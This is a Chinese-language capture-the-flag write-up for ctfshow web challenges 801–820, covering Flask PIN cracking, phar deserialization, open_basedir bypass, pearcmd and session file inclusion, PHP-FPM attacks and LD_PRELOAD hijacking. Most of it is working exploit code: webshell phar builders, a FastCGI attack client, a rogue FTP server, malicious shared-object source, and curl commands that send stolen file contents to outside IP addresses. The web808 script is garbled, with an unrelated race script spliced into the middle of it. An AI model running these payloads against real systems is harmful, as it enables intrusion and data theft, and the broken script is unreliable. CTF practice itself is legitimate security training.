##     web801

考点：flaskpin码的计算

https://xz.aliyun.com/t/8092

```
probably_public_bits包含4个字段，分别为
username
modname
getattr(app, 'name', app.class.name)
getattr(mod, 'file', None)

其中username对应的值为当前主机的用户名
	linux可以查看/etc/passwd
	windows可以查看C:/Users目录
modname的值为'flask.app'
getattr(app, 'name', app.class.name)对应的值为'Flask'
getattr(mod, 'file', None)对应的值为app包的绝对路径

private_bits包含两个字段，分别为
str(uuid.getnode())
get_machine_id()

其中str(uuid.getnode())为网卡mac地址的十进制值
	在inux系统下得到存储位置为/sys/class/net/（对应网卡）/address 一般为eth0
	windows中cmd执行config /all查看
get_machine_id()的值为当前机器唯一的机器码
	对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id
	docker机则读取/proc/self/cgroup。
	windows的id在注册表中 （HKEY_LOCAL_MACHINE->SOFTWARE->Microsoft->Cryptography）

```

旧版的

```python
import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
username=getpass.getuser() 
app = Flask(__name__)
modname=getattr(app, "__module__", app.__class__.__module__)
mod = sys.modules.get(modname)

probably_public_bits = [
    username, #用户名 一般为root或者读下/etc/passwd
    modname,  #一般固定为flask.app
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask
    getattr(mod, "__file__", None),    #flask库下app.py的绝对路径，可以通过报错信息得到
]
mac ='02:42:ac:0c:ac:28'.replace(':','')
mac=str(int(mac,base=16))
private_bits = [
	mac,
	 "机器码"
	 ]
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num=None
if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
    print(rv)

```

新版：

```python
import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
import typing as t
username='root'
app = Flask(__name__)
modname=getattr(app, "__module__", t.cast(object, app).__class__.__module__)
mod=sys.modules.get(modname)
mod = getattr(mod, "__file__", None)

probably_public_bits = [
    username, #用户名
    modname,  #一般固定为flask.app
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask
    '/usr/local/lib/python3.8/site-packages/flask/app.py',   #主程序（app.py）运行的绝对路径
]
print(probably_public_bits)
mac ='02:42:ac:0c:ac:28'.replace(':','')
mac=str(int(mac,base=16))
private_bits = [
   mac,#mac地址十进制
 "机器码"
     ]
print(private_bits)
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv=None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)

```

**需要填的值就一个变化的地方—机器码。旧版的只需要读取/proc/self/cgroup即可，但是新增需要在前面再拼上/etc/machine-id或者/proc/sys/kernel/random/boot_id的值**

##  web802

考点：无数字字母进行命令执行

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
$cmd = $_POST['cmd'];

if(!preg_match('/[a-z]|[0-9]/i',$cmd)){
    eval($cmd);
}
```

方法：异或，或，取反，自增，上传临时文件

羽师傅的博客：https://blog.csdn.net/miuzzx/article/details/109143413

上传临时文件：先上传文件，会暂时保存在`/tmp/xxxx`路径下，然后通过`?>`闭合前面的`eval`，后面的php语句，`反引号`来执行命令，`.`来执行一个文件，`cat /f*`,就可以达到实现命令执行了，特别巧妙的技巧了。

##  web803

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

这道题的思路：过滤了`php`和`data`，不能利用这几个协议，在文件包含中，还可以使用`zip`协议和`phar`协议(远程文件包含这个不行)

`file`协议直接读文件，但是有个`file_exists`需要存在一个`txt`文件

而且测试了一下，只能往`/tmp`中去写入文件，网站目录`/var/www/html`写不进去的

日志包含也还是收到`txt`后缀的影响

所以整体的思路，先利用`file_put_contents`讲执行命令的语句写入到文件中，然后再通过`include`包含



利用zip协议按道理来说是可以的，但是我试了一下，包含不了，失败（原因应该是没法将zip中内容传到远程服务器上）

利用phar协议

直接将`马`放到phar包中

```php
<?php 
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>
```

直接给脚本

```php
import requests
url="http://2ed54b8f-1578-49c9-8386-ce7c9c6f68c6.challenge.ctf.show/"
data1={
    'file': '/tmp/shell.phar',
    'content': open('shell.phar','rb').read()
}
data2={
    'file': 'phar:///tmp/shell.phar/a',
    'content': '123',
    '1': 'system("ls");'
}
requests.post(url=url,data=data1)
r = requests.post(url=url,data=data2)
print(r.text)
```

phar实现文件包含原理：当与包含函数结合后，会直接执行phar中的内容，达到命令执行的效果

##  web804

考点：利用`phar反序列化`

利用特点：有`file_put_contents`实现文件上传的目的，将`phar`文件上传到题目服务器上，然后`file_exists`和`unlink`的影响函数，都可以触发`phar的反序列化`，从而达到反序列化中的命令执行

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

phar文件的生成：

```php
<?php 
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}
$a=new hacker();
$a->code="system('cat f*');";
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->setMetadata($a);
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>

```

然后上传，触发命令执行，得到flag

```python
import requests  
url="http://bf1f07fe-9a6c-4425-994b+7886f64b2923.challenge.ctf.show/index.php"
data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
data2={'file':'phar:///tmp/a.phar','content':'123'}
requests.post(url,data=data1)
r=requests.post(url,data=data2)
print(r.text)

```

##  web805

考点：绕过open_basedir()

https://blog.csdn.net/unexpectedthing/article/details/125577789

几种常见的姿势：

读取文件目录：

```php
1=$dir=new DirectoryIterator('glob:///*');
	foreach($dir as $d){
    	echo $d->__toString().'</br>';
    }
```

```php
1=mkdir('flag');chdir('flag');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir("/"));
```

利用chdir和ini_set

读取文件内容：

```php
1=mkdir('flag');chdir('flag');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/ctfshowflag');
```

##  web806

考点：无参数构造RCE

https://xz.aliyun.com/t/9360

payload:

```
code=system(end(current(get_defined_vars())));&shell=cat /c*;
```

##  web807

考点：反弹shell

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_GET['url'];

$schema = substr($url,0,8);

if($schema==="https://"){
    shell_exec("curl $url");
}

```

`shell_exec`无回显，加上`www-data`的权限，不能通过`ls / >/var/www/html/1.php`来写入本地文件

我们只是利用外带数据，`curl外带数据`

```
url=https://;curl http://42.193.170.176:12345/ -F file=`cat /*`
?url=https://;curl http://42.193.170.176:12345/?a=`cat /*`
```

##  web808

考点：文件包含，session文件包含getshell，利用Segfault遗留下临时文件文件进行getshell

**1.利用Segfault遗留下临时文件文件进行getshell：**

条件：php7.1.20以下

原理：就是利用php crash后，会导致上传的临时文件保留下来，然后对其进行文件包含达到RCE的情况

https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html

```php
<?php
error_reporting(0);
$file = $_GET['file'];


if(isset($file) && !preg_match("/input|data|phar|log/i",$file)){
    include $file;
}else{
    show_source(__FILE__);
    print_r(scandir("/tmp"));
}
```

给出了/tmp下的文件，所有不需要爆破出tmp文件，直接包含

直接给出payload：

```python
import requests
import re
url = "http://6c9ff9d7-497d-4912-942c-0ab8c8d54175.challenge.ctf.show/"
file={
	'file':'<?php eval($_POST[1]);?>'
}
requests.post(url+'?file=php://filter/string.strip_tags/resource=/etc/passwd',files=file)
r=requests.get(url)
#print(r.text)
tmp=re.findall('=> (php.*?)\\n',r.text,re.S)[-1]
print(tmp)
r=requests.get(url+'?file=/tmp/'+tmp)
print(r.text)

```

2.当然这个也可以利用session文件包含

```python
import requests
import threading
import sys
session=requests.session()
sess='z3eyond'
url1="http://6c9ff9d7-497d-4912-942c-0ab8c8d54175.challenge.ctf.show/"
url2='http://6c9ff9d7-497d-4912-942c-0ab8c8d54175.challenge.ctf.show/?file=/tmp/sess_z3eyond'
data1={
    'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
}import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://192.168.1.162:8080/index.php'
session = requests.session()
flag = 'helloworld'


def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success', '<?=phpinfo()?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )


def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )

        if flag.encode() in response.content:
            e.set()


if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)
data2={
    '1':'echo 11123;system("cat /*");',
}
file={
    'file':'1'
}
cookies={
    'PHPSESSID': sess
}
def write():
    while True:
        r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
    while True:
        r = session.post(url2,data=data2)
        if '11123' in r.text:
            print(r.text)

if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write).start()
        for i in range(1,30):
            threading.Thread(target=read).start()
    event.set()

```

只是这个需要条件竞争，可能会跑不出来

##  web809

考点：文件包含，pearcmd.php文件包含到RCE

条件：

1. 安装了pear（这样才能有pearcmd.php），在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。
2. 开启了`register_argc_argv，`Docker环境下的PHP会开启`register_argc_argv`这个配置
3. 存在文件包含且可以包含后缀为php的文件且没有`open_basedir`的限制。

学习链接：[feng师傅的](https://blog.csdn.net/rfrder/article/details/121042290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165691505116782425121278%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165691505116782425121278&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121042290-null-null.185^v2^tag_show&utm_term=pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&spm=1018.2226.3001.4450)

https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html

payload:

不出网：

```
?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/z3eyond.php+-d+man_dir=<?eval($_POST[1]);?>+-s+

?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php 
```

出网的：

```
GET /?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://xxx:xxx/test.php 
```

![image-20220704160504056](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220704160504056.png)



然后直接包含：
![image-20220704160530449](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220704160530449.png)

##  web810

考点：SSRF中gopher打fastcgi

直接gopherus工具一把嗦



![image-20220705111154019](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220705111154019.png)



##  web811

考点：FTP的被动模式打FPM漏洞代码、

```php
<?php
$contents = file_get_contents($_GET['viewFile']);
file_put_contents($_GET['viewFile'], $contents);
```

这里读取路径viewFile，之后写回文件中。这看似什么都没有做。

这份代码可以用来攻击PHP-FPM



如果一个客户端试图从FTP服务器上读取文件，服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口。

现在如果我们使用`viewFile=ftp://evil-server/file.txt`那么会发生：



首先通过 file_get_contents() 函数连接到我们的FTP服务器，并下载file.txt。
然后再通过 file_put_contents() 函数连接到我们的FTP服务器，并将其上传回file.txt。

那此时，在它尝试使用file_put_contents()上传回去时，我们告诉它把文件发送到127.0.0.1:9001(fpm的端口，默认是9000)
那么，我们就在这中间造成了一次SSRF，攻击php-fpm



我们先来个恶意的FTP:

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0',2345)) #端口可改
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()

```

然后gopherus生成payload：

![image-20220705174104878](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220705174104878.png)

直接打：（payload只要下划线后面的，不需要二次编码）

![image-20220705174135055](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220705174135055.png)

##  web812

考点：FPM的未授权访问

直接利用脚本打

```php
import socket
import random
import argparse
import sys
from io import BytesIO

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php system("cat /flagfile"); exit; ?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=28074, type=int)

    args = parser.parse_args()

    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    content = args.code
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    response = client.request(params, content)
    print(force_text(response))

```

![image-20220705180605364](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/image-20220705180605364.png)

##  web813

考点：同样也是加载恶意so文件，只是这个so文件是劫持mysqli.so文件

[看羽师傅的吧](https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165700916316781685398566%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165700916316781685398566&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124038567-null-null.185^v2^tag_show&utm_term=%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF&spm=1018.2226.3001.4450)



##  web814

考点:**劫持getuid**,加载恶意so文件，实现RCE

```php
<?php
error_reporting(0);

$action = $_GET['a'];
switch ($action) {
    case 'phpinfo':
        phpinfo();
        break;
    
    case 'write':
        file_put_contents($_POST['file'],$_POST['content']);
        break;

    case 'run':
        putenv($_GET['env']);
        system("whoami");
        break;

    default:
        highlight_file(__FILE__);
        break;
}
```

生成so文件，shell.c

这是劫持getuid的so文件

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload(){
        system("curl http://url:port?s=`cat /*`");
}
int getuid()
{
        if(getenv("LD_PRELOAD")==NULL){ return 0;}
        unsetenv("LD_PRELOAD");
        payload();
}


```

gcc -c -fPIC shell.c -o shell&&gcc --share shell -o shell.so

生成完后，直接上本子

```python
import requests
url="http://53380121-bba5-4f41-8143-39a5fdff85b0.challenge.ctf.show/"
data={'file':'/tmp/shell.so','content':open('shell.so','rb').read()}
requests.post(url+'?a=write',data=data)
requests.get(url+'?a=run&env=LD_PRELOAD=/tmp/shell.so')
```

原理：生成恶意so文件，然后放到环境变量中，等进程加载该so文件后，从而达到命令执行的结果。

##  web815

考点：劫持构造器

上面的例子构造的so文件是劫持某一个函数

下面的一个比较通用：

在GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行__attribute__((constructor)) 修饰的函数。

所以这个写出的C文件

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void hack(void)
{
    unsetenv("LD_PRELOAD");
    system("echo z3eyond");
    system("curl http://xxx:12345/?a=`cat /*`;");
}
```

本子：

```python

import requests
url="http://0ff2bf53-5121-42ea-bef7-3d43cc5fe03b.challenge.ctf.show/"
data={'file':'/tmp/shell.so','content':open('shell.so','rb').read()}
requests.post(url+'?a=write',data=data)
requests.get(url+'?a=run&env=LD_PRELOAD=/tmp/shell.so')
```

##  web816

考点：上传临时文件，来劫持进程达到RCE

这个位置没有上传文件的地方，但是我们可以利用临时文件来利用。

我们将恶意so文件上传上去，会作为临时文件保存到`/tmp/`目录下

然后有`$env.scandir("/tmp")[2]`得到临时文件路径，从而达到利用`LD_PRELOAD`的环境变量来RCE

注意：一般临时文件上传上去，不好拿到文件名

so文件可以不变

直接给本子

```python
import requests
url="http://ed96f432-b5eb-405f-8875-dd1363f5c843.challenge.ctf.show/?env=LD_PRELOAD=/tmp/"
files={'file':open('shell.so','rb').read()}
response=requests.post(url,files=files)
response=requests.post(url,files=files)
html = response.text
print(html)
```

##  web817

考点：

1. 让后端 php 请求一个过大的文件
2. Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存
3. 虽然Nginx 删除了`/var/lib/nginx/fastcgi`下的临时文件，但是在 `/proc/pid/fd/` 下我们可以找到被删除的文件
4. 遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI  

原理链接：

https://tttang.com/archive/1384/#toc_0x03-counter-nginx-request-body-temp-lfi

```php
$file = $_GET['file'];
if(isset($file) && preg_match("/^\/(\w+\/?)+$/", $file)){
	shell_exec(shell_exec("cat $file"));

}
```

两个shell_exec，相当于我们`cat $file`后的内容，最后又作为命令去执行

关于对`/proc`目录的解释比较详细：

https://blog.spoock.com/2019/10/08/proc/ 

这个题链接：

https://blog.csdn.net/miuzzx/article/details/124489107

本子：

```python
import  threading, requests
import socket
import re
port= 28053
s=socket.socket()
s.connect(('pwn.challenge.ctf.show',port))
s.send(f'''GET / HTTP/1.1
Host:127.0.0.1

	'''.encode())
data=s.recv(1024).decode()
s.close()
pid = re.findall('(.*?) www-data',data)[0].strip()
print(pid)

con="curl http://101.34.94.44:4567?`cat /f*`;"+'0'*1024*500
l = len(con)
def upload():
	while True:
		s=socket.socket()
		s.connect(('pwn.challenge.ctf.show',port))
		x=f'''POST / HTTP/1.1
Host: 127.0.0.1
Content-Length: {l}
Content-Type: application/x-www-form-urlencoded
Connection: close

{con}

		'''.encode()
		s.send(x)
		s.close()

def bruter():
	while True:
		for fd in range(3,40):
			print(fd)
			s=socket.socket()
			s.connect(('pwn.challenge.ctf.show',port))
			s.send(f'''GET /?file=/proc/{pid}/fd/{fd} HTTP/1.1
Host: 127.0.0.1
Connection: close

'''.encode())
			print(s.recv(2048).decode())
			s.close()


for i in range(30):
    t = threading.Thread(target=upload)
    t.start()
for j in range(30):
    a = threading.Thread(target=bruter)
    a.start()




```

##  web818

考点：还是通过上传一个特别大的so文件（有恶意的代码和一些其他的东西）,让Nginx产生临时文件，文件内容写入临时文件，然后env的路径赋值临时文件的路径，最后就是LD_PRELOAD环境变量RCE

需要爆破pid号和fd下的号

```php
$env = $_GET['env'];
if(isset($env)){
	putenv($env);
	system("echo ctfshow");
}else{
	system("ps aux");
}
```

本子：

```php
# coding: utf-8

import urllib.parse
import  threading, requests
import socket
import re
port= 28133
s=socket.socket()
s.connect(('pwn.challenge.ctf.show',port))
s.send(f'''GET / HTTP/1.1
Host:127.0.0.1

	'''.encode())
data=s.recv(1024).decode()
s.close()
pid = re.findall('(.*?) www-data',data)[0].strip()
print(pid)
l=str(len(open('hack.so','rb').read()+b'\n'*1024*200)).encode()
def upload():
	while True:
		s=socket.socket()
		s.connect(('pwn.challenge.ctf.show',port))	
		x=b'''POST / HTTP/1.1
Host: 127.0.0.1
User-Agent: yu22x
Content-Length: '''+l+b'''
Content-Type: application/x-www-form-urlencoded
Connection: close

'''+open('hack.so','rb').read()+b'\n'*1024*200+b'''

'''
		s.send(x)
		s.close()

def bruter():
	while True:
		for fd in range(3,40):
			print(fd)
			s=socket.socket()
			s.connect(('pwn.challenge.ctf.show',port))
			s.send(f'''GET /?env=LD_PRELOAD=/proc/{pid}/fd/{fd} HTTP/1.1
Host: 127.0.0.1
User-Agent: yu22x
Connection: close

'''.encode())
			print(s.recv(2048).decode())
			s.close()


for i in range(30):
    t = threading.Thread(target=upload)
    t.start()
for j in range(30):
    a = threading.Thread(target=bruter)
    a.start()


```

##  web819

破壳漏洞的一些利用方式

[羽师傅的](https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165700916316781685398566%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165700916316781685398566&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-124038567-null-null.185^v2^tag_show&utm_term=%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF&spm=1018.2226.3001.4450)

##  web820

上传的马

